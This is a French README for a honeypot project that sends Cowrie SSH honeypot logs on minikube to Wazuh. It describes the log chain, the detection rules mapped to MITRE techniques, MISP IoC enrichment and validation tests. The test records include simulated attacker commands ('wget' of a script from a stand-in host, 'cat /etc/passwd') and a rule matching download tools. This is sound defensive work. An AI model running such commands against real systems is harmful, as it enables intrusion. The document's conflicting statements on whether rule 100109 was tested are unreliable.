# HoneypotX — bloc Wazuh

Arborescence (`wazuh/` dans le dépôt de l'équipe) :

```
rules/    règles Wazuh (Cowrie 100101-100110, MISP 100150)
scripts/  déploiement sur le manager (apply_misp_test.sh)
misp/     export MISP → liste CDB (misp_to_cdb.py) + export de test fictif
k8s/      pod Cowrie de test (namespace honeypots)
systemd/  unités utilisateur : montage 9p minikube, rétention des logs
tests/    lignes Cowrie réelles pour wazuh-logtest
docs/     README, TODO, convention des logs
```

Préparer le dossier à copier sur le manager (non versionné, `dist/` est ignoré) :

```bash
mkdir -p dist/honeypotx && cp scripts/apply_misp_test.sh rules/honeypotx_rules.xml misp/misp_to_cdb.py misp/test-misp-export.json tests/misp-samples.json dist/honeypotx/
```

## État (2026-10-15)

| Élément | Valeur |
|---|---|
| Manager | VM OVA all-in-one, 192.168.220.130, Wazuh v4.14.7 (révision rc1) |
| Agent | `wazuh-agent` 4.14.7-1 (dépôt 4.x stable), bloqué avec `apt-mark hold` |
| Nom / ID de l'agent | `k8s-node-honeypots` / 001, groupe `honeypots` (synchronisé) |
| Hôte de l'agent | VM Ubuntu 26.04, nœud minikube v1.39.0 (driver docker, Kubernetes 1.37.0) |
| Statut | Active (`agent_control -l`, IP enregistrée : any) |

## Chaîne des logs

```
pod cowrie-test (ns honeypots, cowrie/cowrie:3.1.2, uid 999)
  └─ hostPath /var/log/honeypotx/cowrie  (dans le nœud minikube)
       └─ 9p : honeypotx-mount.service (systemd utilisateur, linger activé)
            minikube mount /var/log/honeypotx:/var/log/honeypotx --uid=999 --gid=999
            └─ VM : /var/log/honeypotx/cowrie/cowrie.json (baraket, 664)
                 └─ wazuh-logcollector (root), localfile json → manager
```

- Collecte : `<localfile>` json dans `/var/ossec/etc/shared/honeypots/agent.conf` sur le manager.
  Ajoute les labels `honeypotx.honeypot=cowrie` et `honeypotx.cluster=minikube`.
- Si `honeypotx-mount.service` s'arrête, Cowrie continue d'écrire dans le nœud mais rien n'arrive sur la VM.
  À contrôler avec `systemctl --user status honeypotx-mount` et `minikube ssh -- mount | grep honeypotx`.
- Cowrie 3.1.2 (config par défaut) : seul SSH (2222) écoute, Telnet est désactivé.
  `admin` accepte tous les mots de passe, `root/root` et `root/123456` sont refusés.

## Règles (`rules/honeypotx_rules.xml` → `/var/ossec/etc/rules/` sur le manager)

| ID | Niveau | Événement | MITRE |
|---|---|---|---|
| 100100 | 0 | tout `cowrie.*` (parent) | — |
| 100101 | 5 | `session.connect` | — |
| 100102 | 5 | `login.failed` | T1110 |
| 100103 | 10 | `login.success` | T1078 |
| 100104 | 10 | ≥ 5 × 100102 en 60 s, même `src_ip` | T1110.001 |
| 100105 | 8 | `command.input` | T1059.004 |
| 100106 | 12 | commande wget/curl/tftp/ftpget/scp/sftp | T1105 |
| 100107 | 10 | commande de découverte des comptes (/etc/passwd, whoami, id…) | T1087 |
| 100108 | 10 | commande de reconnaissance système (uname, /proc/cpuinfo…) | T1082 |
| 100109 | 12 | `session.file_download` / `file_upload` | T1105 |
| 100110 | 3 | `session.closed` | — |

Échantillons réels pour wazuh-logtest : `tests/cowrie-samples.json`.

### Validation

- **wazuh-logtest** (manager) sur les 5 lignes réelles : 100101, 100102 (T1110), 100103 (T1078), 100105 (T1059.004), 100110, sans ERROR.
  5 × `login.failed` : 4 × 100102, puis 100104 en niveau 10 (T1110.001).
  Règles déployées dans `/var/ossec/etc/rules/honeypotx_rules.xml` (wazuh:wazuh 660), wazuh-manager redémarré.
- **Test SSH réel** (2026-10-15, 00:08 UTC, via port-forward, donc `src_ip` = 127.0.0.1).
  Événements écrits dans `cowrie.json` et alertes attendues :

| Heure UTC | Événement Cowrie | Alerte attendue |
|---|---|---|
| 00:08:13 → 00:08:19 | 6 × `login.failed` root (root / 123456) | 6 × 100102 (T1110), 100104 (T1110.001) à la 5e |
| 00:08:21 | `login.success` admin/P@ssw0rd | 100103 (T1078) |
| 00:08:21 | `command.input` `uname -a` | 100108 (T1082) |
| 00:08:21 | `command.input` `cat /etc/passwd` | 100107 (T1087) |
| 00:08:22 | `command.input` `wget http://example.invalid/x.sh` | 100106 (T1105) |
| 00:08:22 | `command.input` `exit` | 100105 (T1059.004) |

  Alertes reçues dans `alerts.json` : **validé** (100101, 100102 ×n, 100104, 100103, 100108, 100107, 100106, 100105, 100110).
  100109 : Cowrie (3.1.2) refuse en dur de télécharger depuis les IP privées
  (`BLOCKED_IPS` dans `cowrie/core/network.py` : 10/8, 172.16/12, 192.168/16, 127/8…, sans option de config).
  Le test avec un pod nginx interne (`payload-test`) a donc échoué ; le pod a été supprimé.
  Test réel avec `wget http://example.com/index.html` (2026-10-15, 00:33:48 UTC) : `cowrie.session.file_download` écrit.
  Ligne enregistrée dans `tests/cowrie-file-download.json`. Alerte côté manager : **validé**
  (100109 « transfert de fichier depuis 127.0.0.1 (http://example.com/index.html) », plus 100106 pour la commande wget).

**Bilan : toutes les règles Cowrie (100101 à 100110) et la règle MISP 100150 sont validées.**
  Pas de `session.file_download` : la résolution DNS de `example.invalid` échoue, donc la règle 100109 n'est pas encore testée.

### Points d'attention

- **Rotation** : Cowrie fait tourner `cowrie.json` à minuit UTC (→ `cowrie.json.AAAA-MM-JJ`).
  Le localfile suit `cowrie.json` : logcollector rouvre bien le nouveau fichier, même via 9p (**validé** le 2026-10-15, sans redémarrage).
  Les fichiers tournés s'accumulent, il faudra une rétention (logrotate ou cron).
- Les commandes passées en une seule ligne (`ssh host 'cmd1; cmd2'`) donnent un seul `command.input`,
  donc une seule alerte (la première règle fille qui correspond).

## Préparé / appliqué hors du flux principal

| Élément | Fichier | Rôle |
|---|---|---|
| Payload de test | (non versionné) | pod nginx interne, appliqué puis **supprimé** (IP privée bloquée par Cowrie) |
| Rétention | `systemd/honeypotx-retention.{service,timer}` | **installée** (timer utilisateur actif, 03:30 + délai aléatoire ≤ 10 min) : gzip > 1 j, suppression > 7 j |
| Déploiement MISP de test | `scripts/apply_misp_test.sh` | sauvegarde, installation, logtest, redémarrage, restauration automatique |

### Enrichissement MISP (liste de test) : **validé** (2026-10-15)

- `apply_misp_test.sh` exécuté sur le manager : wazuh-logtest renvoie 100150, 100150, 100101 comme attendu, manager actif.
- Sauvegarde d'avant le déploiement : `/root/honeypotx-backup-2026-10-15-013121.tgz` (serveur).
- Installé : `/var/ossec/integrations/misp_to_cdb.py`, `/var/ossec/etc/lists/misp-ioc-ip` (4 entrées de test),
  `<list>etc/lists/misp-ioc-ip</list>` dans ossec.conf, règle 100150 (niveau 13).
- La liste contient des IP **fictives** (plages de documentation, plus 10.0.0.5). Elle sera remplacée par la vraie liste MISP (voir TODO.md).
| MISP → CDB | `misp/misp_to_cdb.py` | IP de MISP (to_ids, 30 j) → `/var/ossec/etc/lists/misp-ioc-ip` |
| Règle MISP | `rules/honeypotx_rules.xml` (100150) | niveau 13 si la `src_ip` d'une connexion (100101) est dans la liste |
| Tests MISP | `misp/test-misp-export.json`, `tests/misp-samples.json` | export MISP fictif (plages de documentation) + 3 lignes de connexion |

## Liaison réseau : NAT provisoire

L'agent joint le manager par `ens33` (NAT VMware, 192.168.87.136) : TCP 1514/1515 OK, ping avec TTL 128 (relayé par l'hôte).
Limites :
- le manager voit l'IP de l'hôte et non celle de la VM ;
- la liaison dépend du NAT VMware et du routage de l'hôte Windows.

À faire avant la démo : passer en Host-only (VMnet1, 192.168.220.131/24), voir [TODO.md](TODO.md).
Pas besoin de réinstaller l'agent : il suffit d'appliquer le netplan et de redémarrer l'agent.
